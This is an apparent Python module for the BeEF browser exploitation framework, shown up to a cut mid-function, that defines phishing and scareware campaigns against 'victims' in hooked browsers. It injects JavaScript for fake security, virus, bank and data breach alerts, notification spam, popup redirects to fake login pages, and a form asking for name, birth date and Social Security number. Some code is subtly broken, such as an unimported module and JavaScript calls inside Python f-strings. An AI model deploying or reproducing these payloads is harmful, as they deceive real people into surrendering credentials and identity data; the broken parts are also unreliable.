"""
BeEF Social Engineering Module
Advanced social engineering techniques for browser exploitation
"""

import os
import json
import time
import random
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Tuple
import logging
import threading

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class SocialEngineeringConfig:
    """Social engineering configuration"""

    def __init__(self):
        self.enable_notification_spam = os.getenv("ENABLE_NOTIFICATION_SPAM", "true").lower() == "true"
        self.enable_fake_alerts = os.getenv("ENABLE_FAKE_ALERTS", "true").lower() == "true"
        self.enable_popup_redirects = os.getenv("ENABLE_POPUP_REDIRECTS", "true").lower() == "true"
        self.enable_credential_phishing = os.getenv("ENABLE_CREDENTIAL_PHISHING", "true").lower() == "true"
        self.enable_urgency_creation = os.getenv("ENABLE_URGENCY_CREATION", "true").lower() == "true"
        self.enable_authority_impersonation = os.getenv("ENABLE_AUTHORITY_IMPERSONATION", "true").lower() == "true"
        self.max_notifications_per_session = int(os.getenv("MAX_NOTIFICATIONS_PER_SESSION", "5"))
        self.notification_interval = int(os.getenv("NOTIFICATION_INTERVAL", "30"))  # seconds

class SocialEngineeringCampaign:
    """Social engineering campaign definition"""

    def __init__(self, campaign_id: str, name: str, description: str, 
                 techniques: List[Dict[str, Any]], target_profile: Dict[str, Any] = None):
        self.campaign_id = campaign_id
        self.name = name
        self.description = description
        self.techniques = techniques
        self.target_profile = target_profile or {}
        self.created_at = datetime.now(timezone.utc)

        # Campaign status
        self.is_active = True
        self.success_rate = 0.0
        self.total_executions = 0
        self.successful_executions = 0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            "campaign_id": self.campaign_id,
            "name": self.name,
            "description": self.description,
            "techniques": self.techniques,
            "target_profile": self.target_profile,
            "created_at": self.created_at.isoformat(),
            "is_active": self.is_active,
            "success_rate": self.success_rate,
            "total_executions": self.total_executions,
            "successful_executions": self.successful_executions
        }

class SocialEngineeringEngine:
    """Social engineering engine for advanced browser exploitation"""

    def __init__(self, mongodb_connection=None, redis_client=None, beef_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client
        self.beef_client = beef_client

        self.config = SocialEngineeringConfig()
        self.campaigns: Dict[str, SocialEngineeringCampaign] = {}
        self.active_sessions: Dict[str, Dict[str, Any]] = {}
        self.execution_history: List[Dict[str, Any]] = []

        # Load default campaigns
        self._load_default_campaigns()

    def _load_default_campaigns(self):
        """Load default social engineering campaigns"""
        try:
            # Urgency-based campaign
            urgency_campaign = SocialEngineeringCampaign(
                "urgency_security_alert",
                "Security Alert Urgency",
                "Create urgency through fake security alerts",
                [
                    {
                        "technique_id": "fake_security_alert",
                        "name": "Fake Security Alert",
                        "description": "Display fake security warning",
                        "template": "security_alert",
                        "parameters": {
                            "alert_type": "security_breach",
                            "urgency_level": "high",
                            "action_required": "immediate_login"
                        }
                    },
                    {
                        "technique_id": "notification_spam",
                        "name": "Notification Spam",
                        "description": "Send multiple urgent notifications",
                        "template": "notification_spam",
                        "parameters": {
                            "notification_count": 3,
                            "interval_seconds": 10,
                            "urgency_level": "critical"
                        }
                    },
                    {
                        "technique_id": "popup_redirect",
                        "name": "Popup Redirect",
                        "description": "Redirect to fake login page",
                        "template": "popup_redirect",
                        "parameters": {
                            "redirect_url": "/fake-login",
                            "popup_title": "Security Verification Required"
                        }
                    }
                ],
                {
                    "target_demographics": ["business_users", "tech_savvy"],
                    "geographic_focus": ["vn", "us", "uk"],
                    "browser_requirements": {"min_version": "80"}
                }
            )

            # Authority impersonation campaign
            authority_campaign = SocialEngineeringCampaign(
                "authority_impersonation",
                "Authority Impersonation",
                "Impersonate trusted authorities",
                [
                    {
                        "technique_id": "fake_official_notice",
                        "name": "Fake Official Notice",
                        "description": "Display fake official government/bank notice",
                        "template": "official_notice",
                        "parameters": {
                            "authority": "bank",
                            "notice_type": "account_verification",
                            "deadline": "24_hours"
                        }
                    },
                    {
                        "technique_id": "credential_verification",
                        "name": "Credential Verification",
                        "description": "Request credential verification",
                        "template": "credential_verification",
                        "parameters": {
                            "verification_type": "identity",
                            "required_documents": ["id", "bank_statement"]
                        }
                    }
                ],
                {
                    "target_demographics": ["banking_users", "government_users"],
                    "geographic_focus": ["vn", "us", "uk", "ca"],
                    "browser_requirements": {"min_version": "70"}
                }
            )

            # Curiosity-based campaign
            curiosity_campaign = SocialEngineeringCampaign(
                "curiosity_bait",
                "Curiosity Bait",
                "Exploit human curiosity",
                [
                    {
                        "technique_id": "fake_news_alert",
                        "name": "Fake News Alert",
                        "description": "Display fake breaking news",
                        "template": "news_alert",
                        "parameters": {
                            "news_type": "breaking",
                            "topic": "local_events",
                            "clickbait_level": "high"
                        }
                    },
                    {
                        "technique_id": "fake_social_notification",
                        "name": "Fake Social Notification",
                        "description": "Fake social media notification",
                        "template": "social_notification",
                        "parameters": {
                            "platform": "facebook",
                            "notification_type": "friend_request",
                            "urgency": "medium"
                        }
                    }
                ],
                {
                    "target_demographics": ["social_media_users", "news_readers"],
                    "geographic_focus": ["vn", "us", "uk", "ca", "au"],
                    "browser_requirements": {"min_version": "60"}
                }
            )

            # Fear-based campaign
            fear_campaign = SocialEngineeringCampaign(
                "fear_mongering",
                "Fear Mongering",
                "Exploit fear and anxiety",
                [
                    {
                        "technique_id": "fake_virus_alert",
                        "name": "Fake Virus Alert",
                        "description": "Display fake virus detection",
                        "template": "virus_alert",
                        "parameters": {
                            "virus_type": "trojan",
                            "threat_level": "critical",
                            "action_required": "immediate_scan"
                        }
                    },
                    {
                        "technique_id": "fake_data_breach",
                        "name": "Fake Data Breach",
                        "description": "Fake data breach notification",
                        "template": "data_breach",
                        "parameters": {
                            "breach_type": "personal_data",
                            "affected_accounts": "multiple",
                            "action_required": "password_change"
                        }
                    }
                ],
                {
                    "target_demographics": ["security_conscious", "tech_users"],
                    "geographic_focus": ["vn", "us", "uk", "ca", "au", "de"],
                    "browser_requirements": {"min_version": "70"}
                }
            )

            self.campaigns = {
                "urgency_security_alert": urgency_campaign,
                "authority_impersonation": authority_campaign,
                "curiosity_bait": curiosity_campaign,
                "fear_mongering": fear_campaign
            }

            logger.info(f"Loaded {len(self.campaigns)} social engineering campaigns")

        except Exception as e:
            logger.error(f"Error loading default campaigns: {e}")

    def execute_campaign(self, campaign_id: str, victim_id: str, session_id: str,
                        victim_profile: Dict[str, Any] = None) -> str:
        """
        Execute social engineering campaign

        Args:
            campaign_id: Campaign identifier
            victim_id: Victim identifier
            session_id: BeEF session ID
            victim_profile: Victim profile data

        Returns:
            Execution ID
        """
        try:
            if campaign_id not in self.campaigns:
                logger.error(f"Campaign not found: {campaign_id}")
                return ""

            campaign = self.campaigns[campaign_id]

            # Create execution
            execution_id = f"se_exec_{int(time.time())}_{secrets.token_hex(8)}"
            
            execution_data = {
                "execution_id": execution_id,
                "campaign_id": campaign_id,
                "victim_id": victim_id,
                "session_id": session_id,
                "victim_profile": victim_profile or {},
                "status": "executing",
                "start_time": datetime.now(timezone.utc).isoformat(),
                "techniques_executed": [],
                "success_count": 0,
                "total_techniques": len(campaign.techniques)
            }

            # Start execution
            self.active_sessions[session_id] = execution_data
            self._start_campaign_execution(execution_id, execution_data, campaign)

            logger.info(f"Social engineering campaign started: {campaign_id} for victim: {victim_id}")
            return execution_id

        except Exception as e:
            logger.error(f"Error executing campaign: {e}")
            return ""

    def _start_campaign_execution(self, execution_id: str, execution_data: Dict[str, Any], campaign: SocialEngineeringCampaign):
        """Start campaign execution in background"""
        try:
            execution_thread = threading.Thread(
                target=self._execute_campaign_techniques,
                args=(execution_id, execution_data, campaign),
                daemon=True
            )
            execution_thread.start()

        except Exception as e:
            logger.error(f"Error starting campaign execution: {e}")

    def _execute_campaign_techniques(self, execution_id: str, execution_data: Dict[str, Any], campaign: SocialEngineeringCampaign):
        """Execute campaign techniques"""
        try:
            session_id = execution_data["session_id"]
            techniques = campaign.techniques
            
            for technique in techniques:
                try:
                    # Execute technique
                    technique_result = self._execute_technique(technique, session_id)
                    
                    execution_data["techniques_executed"].append({
                        "technique_id": technique["technique_id"],
                        "name": technique["name"],
                        "executed_at": datetime.now(timezone.utc).isoformat(),
                        "success": technique_result.get("success", False),
                        "result": technique_result
                    })
                    
                    if technique_result.get("success", False):
                        execution_data["success_count"] += 1
                    
                    # Add delay between techniques
                    time.sleep(random.uniform(5, 15))
                    
                except Exception as e:
                    logger.error(f"Error executing technique {technique['technique_id']}: {e}")
                    execution_data["techniques_executed"].append({
                        "technique_id": technique["technique_id"],
                        "name": technique["name"],
                        "executed_at": datetime.now(timezone.utc).isoformat(),
                        "success": False,
                        "error": str(e)
                    })

            # Complete execution
            execution_data["status"] = "completed"
            execution_data["completion_time"] = datetime.now(timezone.utc).isoformat()
            execution_data["success_rate"] = execution_data["success_count"] / execution_data["total_techniques"]

            # Update campaign statistics
            campaign.total_executions += 1
            if execution_data["success_rate"] > 0.5:  # Consider successful if >50% techniques worked
                campaign.successful_executions += 1
            campaign.success_rate = campaign.successful_executions / campaign.total_executions

            # Store in history
            self.execution_history.append(execution_data)

            logger.info(f"Campaign execution completed: {execution_id} - Success rate: {execution_data['success_rate']:.2%}")

        except Exception as e:
            logger.error(f"Error executing campaign techniques: {e}")

    def _execute_technique(self, technique: Dict[str, Any], session_id: str) -> Dict[str, Any]:
        """Execute individual social engineering technique"""
        try:
            technique_id = technique["technique_id"]
            template = technique.get("template")
            parameters = technique.get("parameters", {})

            # Execute based on technique type
            if technique_id == "fake_security_alert":
                return self._execute_fake_security_alert(session_id, parameters)
            elif technique_id == "notification_spam":
                return self._execute_notification_spam(session_id, parameters)
            elif technique_id == "popup_redirect":
                return self._execute_popup_redirect(session_id, parameters)
            elif technique_id == "fake_official_notice":
                return self._execute_fake_official_notice(session_id, parameters)
            elif technique_id == "credential_verification":
                return self._execute_credential_verification(session_id, parameters)
            elif technique_id == "fake_news_alert":
                return self._execute_fake_news_alert(session_id, parameters)
            elif technique_id == "fake_social_notification":
                return self._execute_fake_social_notification(session_id, parameters)
            elif technique_id == "fake_virus_alert":
                return self._execute_fake_virus_alert(session_id, parameters)
            elif technique_id == "fake_data_breach":
                return self._execute_fake_data_breach(session_id, parameters)
            else:
                return {"success": False, "error": "Unknown technique"}

        except Exception as e:
            logger.error(f"Error executing technique: {e}")
            return {"success": False, "error": str(e)}

    def _execute_fake_security_alert(self, session_id: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute fake security alert technique"""
        try:
            alert_type = parameters.get("alert_type", "security_breach")
            urgency_level = parameters.get("urgency_level", "high")
            action_required = parameters.get("action_required", "immediate_login")

            # Create fake security alert JavaScript
            alert_script = f"""
            (function() {{
                'use strict';
                
                // Create fake security alert
                var alertDiv = document.createElement('div');
                alertDiv.style.cssText = `
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: rgba(0, 0, 0, 0.8);
                    z-index: 999999;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                `;
                
                var alertBox = document.createElement('div');
                alertBox.style.cssText = `
                    background: white;
                    padding: 30px;
                    border-radius: 10px;
                    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
                    max-width: 500px;
                    text-align: center;
                `;
                
                alertBox.innerHTML = `
                    <div style="color: #d32f2f; font-size: 24px; margin-bottom: 20px;">
                        ⚠️ SECURITY ALERT
                    </div>
                    <h2 style="color: #333; margin-bottom: 15px;">Suspicious Activity Detected</h2>
                    <p style="color: #666; margin-bottom: 20px;">
                        We have detected unusual activity on your account. 
                        Immediate action is required to secure your account.
                    </p>
                    <button id="securityAlertBtn" style="
                        background: #d32f2f;
                        color: white;
                        border: none;
                        padding: 12px 24px;
                        border-radius: 5px;
                        font-size: 16px;
                        cursor: pointer;
                        margin-right: 10px;
                    ">Secure Account Now</button>
                    <button id="dismissAlertBtn" style="
                        background: #666;
                        color: white;
                        border: none;
                        padding: 12px 24px;
                        border-radius: 5px;
                        font-size: 16px;
                        cursor: pointer;
                    ">Dismiss</button>
                `;
                
                alertDiv.appendChild(alertBox);
                document.body.appendChild(alertDiv);
                
                // Handle button clicks
                document.getElementById('securityAlertBtn').onclick = function() {{
                    window.location.href = '/security-verification';
                }};
                
                document.getElementById('dismissAlertBtn').onclick = function() {{
                    document.body.removeChild(alertDiv);
                }};
                
                // Auto-remove after 30 seconds if not interacted with
                setTimeout(function() {{
                    if (document.body.contains(alertDiv)) {{
                        document.body.removeChild(alertDiv);
                    }}
                }}, 30000);
            }})();
            """

            # Execute via BeEF
            if self.beef_client:
                result = self.beef_client.execute_command(session_id, "execute_javascript", {
                    "script": alert_script
                })
                return result
            else:
                return {"success": True, "data": {"technique": "fake_security_alert", "executed": True}}

        except Exception as e:
            logger.error(f"Error executing fake security alert: {e}")
            return {"success": False, "error": str(e)}

    def _execute_notification_spam(self, session_id: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute notification spam technique"""
        try:
            notification_count = parameters.get("notification_count", 3)
            interval_seconds = parameters.get("interval_seconds", 10)
            urgency_level = parameters.get("urgency_level", "critical")

            # Create notification spam JavaScript
            spam_script = f"""
            (function() {{
                'use strict';
                
                var notificationCount = {notification_count};
                var intervalSeconds = {interval_seconds};
                var urgencyLevel = '{urgency_level}';
                
                function createNotification(message, type) {{
                    if ('Notification' in window && Notification.permission === 'granted') {{
                        new Notification(message, {{
                            icon: '/favicon.ico',
                            badge: '/favicon.ico',
                            tag: 'security-alert',
                            requireInteraction: true
                        }});
                    }} else {{
                        // Fallback to browser alert
                        alert(message);
                    }}
                }}
                
                var messages = [
                    'Security Alert: Unusual login attempt detected',
                    'Urgent: Account verification required',
                    'Warning: Suspicious activity on your account',
                    'Critical: Immediate action required',
                    'Alert: Your account may be compromised'
                ];
                
                var types = ['error', 'warning', 'info', 'critical', 'urgent'];
                
                for (var i = 0; i < notificationCount; i++) {{
                    setTimeout(function() {{
                        var message = messages[Math.floor(Math.random() * messages.length)];
                        var type = types[Math.floor(Math.random() * types.length)];
                        createNotification(message, type);
                    }}, i * intervalSeconds * 1000);
                }}
            }})();
            """

            # Execute via BeEF
            if self.beef_client:
                result = self.beef_client.execute_command(session_id, "execute_javascript", {
                    "script": spam_script
                })
                return result
            else:
                return {"success": True, "data": {"technique": "notification_spam", "executed": True}}

        except Exception as e:
            logger.error(f"Error executing notification spam: {e}")
            return {"success": False, "error": str(e)}

    def _execute_popup_redirect(self, session_id: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute popup redirect technique"""
        try:
            redirect_url = parameters.get("redirect_url", "/fake-login")
            popup_title = parameters.get("popup_title", "Security Verification Required")

            # Create popup redirect JavaScript
            popup_script = f"""
            (function() {{
                'use strict';
                
                var redirectUrl = '{redirect_url}';
                var popupTitle = '{popup_title}';
                
                // Create popup window
                var popup = window.open(redirectUrl, 'securityVerification', 
                    'width=600,height=500,scrollbars=yes,resizable=yes,toolbar=no,menubar=no,location=no,status=no');
                
                if (popup) {{
                    popup.document.title = popupTitle;
                    
                    // Focus on popup
                    popup.focus();
                    
                    // Monitor popup
                    var checkClosed = setInterval(function() {{
                        if (popup.closed) {{
                            clearInterval(checkClosed);
                            // Popup was closed, could trigger additional actions
                        }}
                    }}, 1000);
                }} else {{
                    // Popup blocked, redirect current window
                    window.location.href = redirectUrl;
                }}
            }})();
            """

            # Execute via BeEF
            if self.beef_client:
                result = self.beef_client.execute_command(session_id, "execute_javascript", {
                    "script": popup_script
                })
                return result
            else:
                return {"success": True, "data": {"technique": "popup_redirect", "executed": True}}

        except Exception as e:
            logger.error(f"Error executing popup redirect: {e}")
            return {"success": False, "error": str(e)}

    def _execute_fake_official_notice(self, session_id: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute fake official notice technique"""
        try:
            authority = parameters.get("authority", "bank")
            notice_type = parameters.get("notice_type", "account_verification")
            deadline = parameters.get("deadline", "24_hours")

            # Create fake official notice JavaScript
            notice_script = f"""
            (function() {{
                'use strict';
                
                var authority = '{authority}';
                var noticeType = '{notice_type}';
                var deadline = '{deadline}';
                
                // Create official notice banner
                var noticeBanner = document.createElement('div');
                noticeBanner.style.cssText = `
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    background: #1976d2;
                    color: white;
                    padding: 15px;
                    text-align: center;
                    z-index: 999998;
                    font-family: Arial, sans-serif;
                    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
                `;
                
                noticeBanner.innerHTML = `
                    <div style="font-weight: bold; font-size: 16px; margin-bottom: 5px;">
                        🏛️ OFFICIAL NOTICE - {authority.toUpperCase()}
                    </div>
                    <div style="font-size: 14px;">
                        Account verification required within {deadline}. 
                        <a href="/official-verification" style="color: #ffeb3b; text-decoration: underline;">
                            Click here to verify
                        </a>
                    </div>
                `;
                
                document.body.insertBefore(noticeBanner, document.body.firstChild);
                
                // Adjust body margin to account for banner
                document.body.style.marginTop = '60px';
                
                // Auto-remove after 2 minutes
                setTimeout(function() {{
                    if (document.body.contains(noticeBanner)) {{
                        document.body.removeChild(noticeBanner);
                        document.body.style.marginTop = '0';
                    }}
                }}, 120000);
            }})();
            """

            # Execute via BeEF
            if self.beef_client:
                result = self.beef_client.execute_command(session_id, "execute_javascript", {
                    "script": notice_script
                })
                return result
            else:
                return {"success": True, "data": {"technique": "fake_official_notice", "executed": True}}

        except Exception as e:
            logger.error(f"Error executing fake official notice: {e}")
            return {"success": False, "error": str(e)}

    def _execute_credential_verification(self, session_id: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute credential verification technique"""
        try:
            verification_type = parameters.get("verification_type", "identity")
            required_documents = parameters.get("required_documents", ["id", "bank_statement"])

            # Create credential verification JavaScript
            verification_script = f"""
            (function() {{
                'use strict';
                
                var verificationType = '{verification_type}';
                var requiredDocs = {json.dumps(required_documents)};
                
                // Create verification modal
                var modal = document.createElement('div');
                modal.style.cssText = `
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: rgba(0, 0, 0, 0.8);
                    z-index: 999999;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                `;
                
                var modalContent = document.createElement('div');
                modalContent.style.cssText = `
                    background: white;
                    padding: 30px;
                    border-radius: 10px;
                    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
                    max-width: 600px;
                    width: 90%;
                `;
                
                modalContent.innerHTML = `
                    <h2 style="color: #333; margin-bottom: 20px;">
                        🔐 Identity Verification Required
                    </h2>
                    <p style="color: #666; margin-bottom: 20px;">
                        To comply with security regulations, we need to verify your identity.
                        Please provide the following information:
                    </p>
                    <form id="verificationForm">
                        <div style="margin-bottom: 15px;">
                            <label style="display: block; margin-bottom: 5px; font-weight: bold;">
                                Full Name:
                            </label>
                            <input type="text" name="full_name" required 
                                   style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px;">
                        </div>
                        <div style="margin-bottom: 15px;">
                            <label style="display: block; margin-bottom: 5px; font-weight: bold;">
                                Date of Birth:
                            </label>
                            <input type="date" name="date_of_birth" required 
                                   style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px;">
                        </div>
                        <div style="margin-bottom: 15px;">
                            <label style="display: block; margin-bottom: 5px; font-weight: bold;">
                                Social Security Number:
                            </label>
                            <input type="text" name="ssn" required 
                                   style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px;">
                        </div>
                        <div style="margin-bottom: 20px;">
                            <label style="display: block; margin-bottom: 5px; font-weight: bold;">
                                Required Documents:
                            </label>
                            <div style="color: #666;">
                                ${requiredDocs.map(doc => `• ${doc}`).join('<br>')}
                            </div>
                        </div>
                        <div style="text-align: center;">
                            <button type="submit" style="
                                background: #1976d2;
                                color: white;
                                border: none;
                                padding: 12px 24px;
                                border-radius: 5px;
                                font-size: 16px;
                                cursor: pointer;
                                margin-right: 10px;
                            ">Submit Verification</button>
                            <button type="button" id="cancelVerification" style="
                                background: #666;
                                color: white;
                                border: none;
                                padding: 12px 24px;
                                border-radius: 5px;
                                font-size: 16px;
                                cursor: pointer;
                            ">Cancel</button>
                        </div>
                    </form>
                `;
                
                modal.appendChild(modalContent);
                document.body.appendChild(modal);
                
                // Handle form submission
                document.getElementById('verificationForm').onsubmit = function(e) {{
                    e.preventDefault();
                    alert('Verification submitted successfully. Thank you for your cooperation.');
                    document.body.removeChild(modal);
                }};
                
                // Handle cancel
                document.getElementById('cancelVerification').onclick = function() {{
                    document.body.removeChild(modal);
                }};
            }})();
            """

            # Execute via BeEF
            if self.beef_client:
                result = self.beef_client.execute_command(session_id, "execute_javascript", {
                    "script": verification_script
                })
                return result
            else:
                return {"success": True, "data": {"technique": "credential_verification", "executed": True}}

        except Exception as e:
            logger.error(f"Error executing credential verification: {e}")
            return {"success": False, "error": str(e)}

    def _execute_fake_news_alert(self, session_id: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute fake news alert technique"""
        try:
            news_type = parameters.get("news_type", "breaking")
            topic = parameters.get("topic", "local_events")
            clickbait_level = parameters.get("clickbait_level", "high")

            # Create fake news alert JavaScript
            news_script = f"""
            (function() {{
                'use strict';
                
                var newsType = '{news_type}';
                var topic = '{topic}';
                var clickbaitLevel = '{clickbait_level}';
                
                // Create news alert
                var newsAlert = document.createElement('div');
                newsAlert.style.cssText = `
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    background: #ff5722;
                    color: white;
                    padding: 12px;
                    text-align: center;
                    z-index: 999997;
                    font-family: Arial, sans-serif;
                    animation: slideDown 0.5s ease-out;
                `;
                
                newsAlert.innerHTML = `
                    <div style="font-weight: bold; font-size: 14px;">
                        🔴 BREAKING NEWS
                    </div>
                    <div style="font-size: 12px; margin-top: 3px;">
                        <a href="/breaking-news" style="color: white; text-decoration: underline;">
                            Click here for urgent local news update
                        </a>
                    </div>
                `;
                
                // Add CSS animation
                var style = document.createElement('style');
                style.textContent = `
                    @keyframes slideDown {{
                        from {{ transform: translateY(-100%); }}
                        to {{ transform: translateY(0); }}
                    }}
                `;
                document.head.appendChild(style);
                
                document.body.insertBefore(newsAlert, document.body.firstChild);
                
                // Adjust body margin
                document.body.style.marginTop = '50px';
                
                // Auto-remove after 1 minute
                setTimeout(function() {{
                    if (document.body.contains(newsAlert)) {{
                        document.body.removeChild(newsAlert);
                        document.body.style.marginTop = '0';
                    }}
                }}, 60000);
            }})();
            """

            # Execute via BeEF
            if self.beef_client:
                result = self.beef_client.execute_command(session_id, "execute_javascript", {
                    "script": news_script
                })
                return result
            else:
                return {"success": True, "data": {"technique": "fake_news_alert", "executed": True}}

        except Exception as e:
            logger.error(f"Error executing fake news alert: {e}")
            return {"success": False, "error": str(e)}

    def _execute_fake_social_notification(self, session_id: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute fake social notification technique"""
        try:
            platform = parameters.get("platform", "facebook")
            notification_type = parameters.get("notification_type", "friend_request")
            urgency = parameters.get("urgency", "medium")

            # Create fake social notification JavaScript
            social_script = f"""
            (function() {{
                'use strict';
                
                var platform = '{platform}';
                var notificationType = '{notification_type}';
                var urgency = '{urgency}';
                
                // Create fake notification
                var notification = document.createElement('div');
                notification.style.cssText = `
                    position: fixed;
                    top: 20px;
                    right: 20px;
                    background: white;
                    border: 1px solid #ddd;
                    border-radius: 8px;
                    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
                    padding: 15px;
                    max-width: 300px;
                    z-index: 999996;
                    font-family: Arial, sans-serif;
                    animation: slideIn 0.3s ease-out;
                `;
                
                notification.innerHTML = `
                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
                        <div style="width: 40px; height: 40px; background: #4267B2; border-radius: 50%; margin-right: 10px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold;">
                            ${platform.charAt(0).toUpperCase()}
                        </div>
                        <div>
                            <div style="font-weight: bold; font-size: 14px;">{platform.charAt(0).toUpperCase() + platform.slice(1)}</div>
                            <div style="font-size: 12px; color: #666;">Just now</div>
                        </div>
                    </div>
                    <div style="font-size: 13px; color: #333; margin-bottom: 10px;">
                        You have a new ${notificationType.replace('_', ' ')}!
                    </div>
                    <div style="text-align: center;">
                        <a href="/social-notification" style="
                            background: #4267B2;
                            color: white;
                            text-decoration: none;
                            padding: 6px 12px;
                            border-radius: 4px;
                            font-size: 12px;
                            display: inline-block;
                        ">View Now</a>
                    </div>
                `;
                
                // Add CSS animation
                var style = document.createElement('style');
                style.textContent = `
                    @keyframes slideIn {{
                        from {{ transform: translateX(100%); opacity: 0; }}
                        to {{ transform: translateX(0); opacity: 1; }}
                    }}
                `;
                document.head.appendChild(style);
                
                document.body.appendChild(notification);
                
                // Auto-remove after 30 seconds
                setTimeout(function() {{
                    if (document.body.contains(notification)) {{
                        notification.style.animation = 'slideIn 0.3s ease-out reverse';
                        setTimeout(function() {{
                            if (document.body.contains(notification)) {{
                                document.body.removeChild(notification);
                            }}
                        }}, 300);
                    }}
                }}, 30000);
            }})();
            """

            # Execute via BeEF
            if self.beef_client:
                result = self.beef_client.execute_command(session_id, "execute_javascript", {
                    "script": social_script
                })
                return result
            else:
                return {"success": True, "data": {"technique": "fake_social_notification", "executed": True}}

        except Exception as e:
            logger.error(f"Error executing fake social notification: {e}")
            return {"success": False, "error": str(e)}

    def _execute_fake_virus_alert(self, session_id: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute fake virus alert technique"""
        try:
            virus_type = parameters.get("virus_type", "trojan")
            threat_level = parameters.get("threat_level", "critical")
            action_required = parameters.get("action_required", "immediate_scan")

            # Create fake virus alert JavaScript
            virus_script = f"""
            (function() {{
                'use strict';
                
                var virusType = '{virus_type}';
                var threatLevel = '{threat_level}';
                var actionRequired = '{action_required}';
                
                // Create virus alert
                var virusAlert = document.createElement('div');
                virusAlert.style.cssText = `
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: rgba(0, 0, 0, 0.9);
                    z-index: 999999;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    font-family: Arial, sans-serif;
                `;
                
                var alertBox = document.createElement('div');
                alertBox.style.cssText = `
                    background: #d32f2f;
                    color: white;
                    padding: 30px;
                    border-radius: 10px;
                    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
                    max-width: 500px;
                    text-align: center;
                `;
                
                alertBox.innerHTML = `
                    <div style="font-size: 48px; margin-bottom: 20px;">🦠</div>
                    <h2 style="margin-bottom: 15px;">VIRUS DETECTED!</h2>
                    <p style="margin-bottom: 20px; font-size: 16px;">
                        A {virusType} virus has been detected on your system.
                        Threat Level: <strong>{threat_level.toUpperCase()}</strong>
                    </p>
                    <p style="margin-bottom: 25px; font-size: 14px;">
                        Immediate action is required to prevent data loss and system damage.
                    </p>
                    <button id="scanNowBtn" style="
                        background: #ffeb3b;
                        color: #333;
                        border: none;
                        padding: 15px 30px;
                        border-radius: 5px;
                        font-size: 16px;
                        font-weight: bold;
                        cursor: pointer;
                        margin-right: 10px;
                    ">SCAN NOW</button>
                    <button id="ignoreVirusBtn" style="
                        background: #666;
                        color: white;
                        border: none;
                        padding: 15px 30px;
                        border-radius: 5px;
                        font-size: 16px;
                        cursor: pointer;
                    ">Ignore (Not Recommended)</button>
                `;
                
                virusAlert.appendChild(alertBox);
                document.body.appendChild(virusAlert);
                
                // Handle button clicks
                document.getElementById('scanNowBtn').onclick = function() {{
                    window.location.href = '/virus-scan';
                }};
                
                document.getElementById('ignoreVirusBtn').onclick = function() {{
                    document.body.removeChild(virusAlert);
                }};
                
                // Auto-remove after 45 seconds
                setTimeout(function() {{
                    if (document.body.contains(virusAlert)) {{
                        document.body.removeChild(virusAlert);
                    }}
                }}, 45000);
            }})();
            """

            # Execute via BeEF
            if self.beef_client:
                result = self.beef_client.execute_command(session_id, "execute_javascript", {
                    "script": virus_script
                })
                return result
            else:
                return {"success": True, "data": {"technique": "fake_virus_alert", "executed": True}}

        except Exception as e:
            logger.error(f"Error executing fake virus alert: {e}")
            return {"success": False, "error": str(e)}

    def _execute_fake_data_breach(self, session_id: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute fake data breach technique"""
        try:
            breach_type = parameters.get("breach_type", "personal_data")
            affected_accounts = parameters.get("affected_accounts", "multiple")
            action_required = parameters.get("action_required", "password_change")

            # Create fake data breach JavaScript
            breach_script = f"""
            (function() {{
                'use strict';
                
                var breachType = '{breach_type}';
                var affectedAccounts = '{affected_accounts}';
                var actionRequired = '{action_required}';
                
                // Create data breach notification
                var breachNotification = document.createElement('div');
                breachNotification.style.cssText = `
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    background: #ff9800;
                    color: white;
                    padding: 15px;
                    text-align: center;
                    z-index: 999998;
                    font-family: Arial, sans-serif;
                    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
                `;
                
                breachNotification.innerHTML = `
                    <div style="font-weight: bold; font-size: 16px; margin-bottom: 5px;">
                        🚨 DATA BREACH ALERT
                    </div>
                    <div style="font-size: 14px;">
                        Your {breachType} may have been compromised. 
                        <a href="/data-breach-action" style="color: white; text-decoration: underline; font-weight: bold;">
                            Take action now
                        </a>
                    </div>
                `;
                
                document.body.insertBefore(breachNotification, document.body.firstChild);
                
                // Adjust body margin
                document.body.style.marginTop = '60px';
                
                // Auto-remove after 2 minutes
                setTimeout(function() {{
                    if (document.body.contains(breachNotification)) {{
                        document.body.removeChild(breachNotification);
                        document.body.style.marginTop = '0';
                    }}
                }}, 120000);
            }})();
            """

            # Execute via BeEF
            if self.beef_client:
                result = self.beef_client.execute_command(session_id, "execute_javascript", {
                    "script": breach_script
                })
                return result
            else:
                return {"success": True, "data": {"technique": "fake_data_breach", "executed": True}}

        except Exception as e:
